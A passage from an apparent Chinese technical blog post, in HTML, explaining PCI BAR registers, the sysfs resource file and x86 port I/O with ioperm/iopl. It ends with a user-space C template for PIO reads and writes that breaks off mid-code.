<li><p><strong>bit3（Prefetchable）</strong>：1 表示这段内存<strong>可预取&#x2F;可合并访问</strong>（适合显存&#x2F;大缓冲区），0 表示<strong>非预取</strong>（寄存器&#x2F;有副作用的读）。</p>
</li>
<li><p>**bits[31:4]**（或 64 位时的更高位）：保存 <strong>MMIO 基址</strong>（低 4 位不用&#x2F;属性）。</p>
</li>
</ul>
</li>
</ul>
<h4 id="查看-BAR-寄存器"><a href="#查看-BAR-寄存器" class="headerlink" title="查看 BAR 寄存器"></a>查看 BAR 寄存器</h4><p>通过 <code>lspci</code> 命令我们可以查看 <code>BAR</code> 寄存器的状态。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lspci -vv -s 65:00.0</span><br><span class="line"><span class="comment"># Region 0: Memory at f7000000 (32-bit, non-prefetchable) [size=64K]</span></span><br><span class="line"><span class="comment"># Region 4: I/O ports at 1060 [size=32]</span></span><br></pre></td></tr></table></figure></div>

<p><code>/sys/bus/pci/devices/0000:65:00.0/resource</code> 是<strong>内核给这个 PCI 设备最终分配的所有“地址资源”的汇总表</strong>。<br>它把“<strong>这个函数现在占了哪些地址段</strong>”一次性列出来：每行三列——<strong>起始地址、结束地址（包含）和标志位</strong>。这些行主要来源于 <strong>BAR0..BAR5（以及可选的 Expansion ROM）</strong> 的分配结果；若该设备是<strong>桥</strong>，还会包含桥窗口（I&#x2F;O window、non-prefetchable MEM window、prefetchable MEM window）等。</p>
<p><code>resource</code> 的每一行格式为：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;start_phys_addr&gt; &lt;end_phys_addr&gt; &lt;flags&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>start &#x2F; end</strong>：物理地址（十六进制），<strong>end 是包含端点</strong>。</p>
<ul>
<li><strong>尺寸</strong> &#x3D; <code>end - start + 1</code>。</li>
</ul>
</li>
<li><p><strong>flags</strong>：内核的 <code>IORESOURCE_*</code> 位集合（十六进制，便于脚本判断类型），常见语义：</p>
<ul>
<li><code>IORESOURCE_IO</code> <code>0x00000100</code>：I&#x2F;O 端口资源</li>
<li><code>IORESOURCE_MEM</code> <code>0x00000200</code>：内存（MMIO）资源</li>
<li><code>IORESOURCE_PREFETCH</code> <code>0x00002000</code>：<strong>prefetchable</strong>（常见于显存等）</li>
<li><code>IORESOURCE_MEM_64</code> <code>0x00100000</code>：64 位内存 BAR</li>
<li><code>IORESOURCE_WINDOW</code> <code>0x00200000</code>：桥转发的窗口（不直接是设备寄存器）</li>
<li><code>IORESOURCE_EXCLUSIVE</code> <code>0x08000000</code>：禁止用户态映射（安全&#x2F;排他）</li>
<li>还有 <code>IORESOURCE_DISABLED/UNSET/BUSY…</code> 等辅助位。</li>
</ul>
</li>
</ul>
<p><strong>resource0…resourceN</strong>：同目录下的 <code>resource0</code>、<code>resource1</code>… 是把每一行（尤其是 <strong>Memory BAR</strong>）单独“摊开”的节点：</p>
<ul>
<li><strong>Memory BAR</strong> 对应的 <code>resourceX</code> 可以 <strong>mmap</strong>（用户态调试常用），直接访问设备寄存器&#x2F;窗口；</li>
<li><strong>I&#x2F;O BAR（端口 I&#x2F;O）</strong> 的那几行<strong>不可 mmap</strong>（它不是内存），要用 <code>in/out</code> 指令。</li>
</ul>
<h3 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h3><h4 id="PIO（Port-I-O，端口-I-O）"><a href="#PIO（Port-I-O，端口-I-O）" class="headerlink" title="PIO（Port-I&#x2F;O，端口 I&#x2F;O）"></a>PIO（Port-I&#x2F;O，端口 I&#x2F;O）</h4><p>PIO 是在 <strong>x86</strong> 体系特有的“<strong>I&#x2F;O 端口地址空间</strong>”（和内存地址空间分离，最多 64K 端口）。设备采用 PIO 通信方式需要满足：</p>
<ul>
<li>设备的 <strong>I&#x2F;O BAR</strong>（BAR 的最低位为 1）指示它使用 I&#x2F;O 空间。</li>
<li>将 <strong>Command.bit0 &#x3D; 1（I&#x2F;O Space Enable）</strong> 后，访问 I&#x2F;O 端口才有效。</li>
</ul>
<blockquote>
<p><strong>&#x2F;proc&#x2F;ioports ⇒ “I&#x2F;O 端口地址空间”的占用清单</strong><br>这里列的是<strong>PIO 端口范围</strong>，通常是被驱动通过 <code>request_region()</code> 注册过的那部分（比如 <code>0x3f8-0x3ff : serial</code>、<code>0xcf8-0xcff : PCI conf1</code>）。没被注册的端口段可能不会显示。</p>
<p>Port-mapped I&#x2F;O（x86 的“端口 I&#x2F;O”）<strong>没有“物理内存地址”</strong>这个概念，只有<strong>I&#x2F;O 端口号</strong>（port number，x86 上是 0–0xFFFF）。访问用 <code>in/out</code> 指令或 <code>/dev/port</code>，不能 <code>mmap</code> 到用户虚拟地址，也不会出现在 <code>/proc/pagemap</code> 里。</p>
</blockquote>
<p>CPU 用 <code>in</code>&#x2F;<code>out</code> 指令访问这些端口。 </p>
<p>x86 的 <code>IN/OUT</code> 指令族采用 16 位端口号（I&#x2F;O 地址空间 0..65535），数据宽度只有 <strong>8&#x2F;16&#x2F;32 位</strong>（没有 64 位）。</p>
<ul>
<li><code>inb/outb</code> ⇒ 8 位（<code>AL</code>）</li>
<li><code>inw/outw</code> ⇒ 16 位（<code>AX</code>）</li>
<li><code>inl/outl</code> ⇒ 32 位（<code>EAX</code>，在 x86-64 也用 32 位形式）</li>
</ul>
<p>指令只允许“累加器”作为数据寄存器：读入到 <code>AL/AX/EAX</code>，或从 <code>AL/AX/EAX</code> 写出；端口在 <code>DX</code> 或 8 位立即数。</p>
<ul>
<li>端口号在 <code>DX</code>：<code>in al, dx</code> &#x2F; <code>in ax, dx</code> &#x2F; <code>in eax, dx</code>；<code>out dx, al/ax/eax</code></li>
<li>端口号是 8 位立即数（零扩展成 16 位）：<code>in al, imm8</code> &#x2F; <code>out imm8, al</code>（常用于固定小端口，如 <code>0x60</code>）</li>
</ul>
<p><code>sys/io.h</code> 提供相关函数封装：<code>inb/inw/inl/outb/outw/outl</code>（这些就是对 <code>IN/OUT</code> 的内联汇编封装）。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">inb</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">inb_p</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="title function_">inw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="title function_">inw_p</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">inl</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">inl_p</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">outb</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outb_p</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outw_p</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outl</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outl_p</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insb</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port, <span class="type">void</span> *addr,</span></span><br><span class="line"><span class="params">          <span class="type">unsigned</span> <span class="type">long</span> count)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">insw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port, <span class="type">void</span> *addr,</span></span><br><span class="line"><span class="params">          <span class="type">unsigned</span> <span class="type">long</span> count)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">insl</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port, <span class="type">void</span> *addr,</span></span><br><span class="line"><span class="params">          <span class="type">unsigned</span> <span class="type">long</span> count)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outsb</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port, <span class="type">const</span> <span class="type">void</span> *addr,</span></span><br><span class="line"><span class="params">          <span class="type">unsigned</span> <span class="type">long</span> count)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outsw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port, <span class="type">const</span> <span class="type">void</span> *addr,</span></span><br><span class="line"><span class="params">          <span class="type">unsigned</span> <span class="type">long</span> count)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outsl</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port, <span class="type">const</span> <span class="type">void</span> *addr,</span></span><br><span class="line"><span class="params">          <span class="type">unsigned</span> <span class="type">long</span> count)</span>;</span><br></pre></td></tr></table></figure></div>

<p>在 Linux 下，用户态线程默认<strong>不能</strong>执行 <code>inb/outb/inw/outw/inl/outl</code> 这类 I&#x2F;O 指令。原因是 CPU 会检查调用线程有没有 I&#x2F;O 端口访问权限；没有的话直接触发保护异常（程序崩掉）。</p>
<p>下面两个 api 都可以获取 I&#x2F;O 访问权限，但是前提都需要 <code>CAP_SYS_RAWIO</code> 能力，即允许执行 <code>ioperm/iopl</code> 等原始 I&#x2F;O 操作。</p>
<ul>
<li><p><strong><code>ioperm(base, len, 1)</code></strong><br>给“当前线程”的 I&#x2F;O 位图里打开 <code>[base, base+len)</code> 这段端口范围，因此你就能对这段端口执行 <code>in/out</code>。需要 <code>CAP_SYS_RAWIO</code> 能力或 root。<code>ioperm</code> 是<strong>按端口范围细粒度授权</strong>的，现代内核支持到 65536 个端口。</p>
</li>
<li><p><strong><code>iopl(3)</code></strong><br>把“当前线程”的 I&#x2F;O 特权级提到 3，相当于<strong>对所有端口</strong>都有访问权。也需要 <code>CAP_SYS_RAWIO</code>。官方文档标注它<strong>已不推荐</strong>，比 <code>ioperm</code> 慢，主要为了老式 X 服务器遗留场景；而且在新内核（≥3.7）上它的继承行为与早期不同。</p>
</li>
</ul>
<p>PIO 读写模板：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_IO 0x00000100ULL  <span class="comment">// 与内核 ioport 标志一致</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> base;        <span class="comment">// 端口基址 (x86 的 I/O 空间是 16-bit)</span></span><br><span class="line">    <span class="type">uint32_t</span> size;        <span class="comment">// BAR 大小（字节）</span></span><br><span class="line">    <span class="type">uint16_t</span> grant_base;  <span class="comment">// 实际通过 ioperm 开放的起始端口</span></span><br><span class="line">    <span class="type">uint32_t</span> grant_len;   <span class="comment">// 实际开放长度</span></span><br><span class="line">    <span class="type">bool</span>     have_ioperm;</span><br><span class="line">    <span class="type">bool</span>     have_iopl;</span><br><span class="line">    <span class="type">bool</span>     inited;</span><br><span class="line">&#125; <span class="type">pio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pio_ctx_t</span> g_pio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：从 /sys/bus/pci/devices/&lt;BDF&gt;/resource 解析出指定 BAR（或自动挑首个 PIO BAR）的 start/end/flags */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_io_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bdf_or_path, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                        <span class="type">uint16_t</span> *out_base, <span class="type">uint32_t</span> *out_size)</span> &#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 可直接传 resource 文件全路径</span></span><br><span class="line">        <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>   idx = <span class="number">0</span>, chosen = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span>  line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start = <span class="number">0</span>, end = <span class="number">0</span>, flags = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;start, &amp;end, &amp;flags) != <span class="number">3</span>) &#123; idx++; <span class="keyword">continue</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(flags &amp; IORESOURCE_IO)) &#123; fclose(fp); errno = EINVAL; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                <span class="keyword">if</span> (end &lt; start || start &gt; <span class="number">0xFFFF</span>ULL) &#123; fclose(fp); errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                *out_base = (<span class="type">uint16_t</span>)start;</span><br><span class="line">                *out_size = (<span class="type">uint32_t</span>)(end - start + <span class="number">1</span>);</span><br><span class="line">                chosen = idx; <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (flags &amp; IORESOURCE_IO)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (end &lt; start || start &gt; <span class="number">0xFFFF</span>ULL) &#123; fclose(fp); errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                *out_base = (<span class="type">uint16_t</span>)start;</span><br><span class="line">                *out_size = (<span class="type">uint32_t</span>)(end - start + <span class="number">1</span>);</span><br><span class="line">                chosen = idx; <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (chosen &lt; <span class="number">0</span>) &#123; errno = ENOENT; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：获取端口访问权限。优先 ioperm(仅开本 BAR 范围)，失败回退 iopl(3) */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">acquire_io_priv</span><span class="params">(<span class="type">uint16_t</span> base, <span class="type">uint32_t</span> size,</span></span><br><span class="line"><span class="params">                           <span class="type">uint16_t</span> *grant_base, <span class="type">uint32_t</span> *grant_len,</span></span><br><span class="line"><span class="params">                           <span class="type">bool</span> *have_ioperm, <span class="type">bool</span> *have_iopl)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span>)base + len &gt; <span class="number">0x10000</span>u) len = <span class="number">0x10000</span>u - base;  <span class="comment">// 不越过 64K 上限</span></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) len = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioperm(base, len, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        *grant_base = base;</span><br><span class="line">        *grant_len  = len;</span><br><span class="line">        *have_ioperm = <span class="literal">true</span>;</span><br><span class="line">        *have_iopl   = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        *grant_base = <span class="number">0</span>;</span><br><span class="line">        *grant_len  = <span class="number">0</span>;</span><br><span class="line">        *have_ioperm = <span class="literal">false</span>;</span><br><span class="line">        *have_iopl   = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ====== 对外 API ====== */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pio_init</span></span><br><span class="line"><span class="comment"> *   bdf_or_path : &quot;0000:bb:dd.f&quot; 形式的 BDF；或直接传 resource 的绝对路径</span></span><br><span class="line"><span class="comment"> *   bar_idx     : 0..5 指定 BAR；传 -1 自动挑选第一个 PIO BAR</span></span><br><span class="line"><span class="comment"> * 返回 0 成功，-1 失败（查看 errno）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bdf_or_path, <span class="type">int</span> bar_idx)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pio.inited) &#123; errno = EALREADY; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> base = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_io_bar(bdf_or_path, bar_idx, &amp;base, &amp;size) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> gbase = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> glen  = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> have_perm = <span class="literal">false</span>, have_iopl = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (acquire_io_priv(base, size, &amp;gbase, &amp;glen, &amp;have_perm, &amp;have_iopl) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    g_pio.base       = base;</span><br><span class="line">    g_pio.size       = size;</span><br><span class="line">    g_pio.grant_base = gbase;</span><br><span class="line">    g_pio.grant_len  = glen;</span><br><span class="line">    g_pio.have_ioperm= have_perm;</span><br><span class="line">    g_pio.have_iopl  = have_iopl;</span><br><span class="line">    g_pio.inited     = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 收尾：撤销 ioperm；iopl 切回 0（可忽略失败，进程退出也会复原） */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_fini</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_pio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_pio.have_ioperm) (<span class="type">void</span>)ioperm(g_pio.grant_base, g_pio.grant_len, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (g_pio.have_iopl)   (<span class="type">void</span>)iopl(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_pio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_pio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查询已初始化的基址/大小（方便打印或检查） */</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">pio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_pio.base; &#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_pio.size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：计算端口号 + 越界检查 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">pio_port</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">int</span> width, <span class="type">uint16_t</span> *port_out)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_pio.inited) &#123; errno = EPERM; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">uint64_t</span>)off + (<span class="type">uint64_t</span>)width &gt; g_pio.size) &#123; errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="type">uint32_t</span> p = (<span class="type">uint32_t</span>)g_pio.base + off;</span><br><span class="line">    <span class="keyword">if</span> (p &gt; <span class="number">0xFFFF</span>u) &#123; errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    *port_out = (<span class="type">uint16_t</span>)p;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读写 API —— 8/16/32 位 */</span></span><br><span class="line"><span class="type">uint8_t</span>  <span class="title function_">pio_read8</span> <span class="params">(<span class="type">uint32_t</span> off)</span> &#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">1</span>,&amp;p)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> inb(p); &#125;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">pio_read16</span><span class="params">(<span class="type">uint32_t</span> off)</span> &#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">2</span>,&amp;p)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> inw(p); &#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pio_read32</span><span class="params">(<span class="type">uint32_t</span> off)</span> &#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">4</span>,&amp;p)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> inl(p); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write8</span> <span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint8_t</span>  v)</span>&#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">1</span>,&amp;p)) <span class="keyword">return</span>; outb(v,p); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title 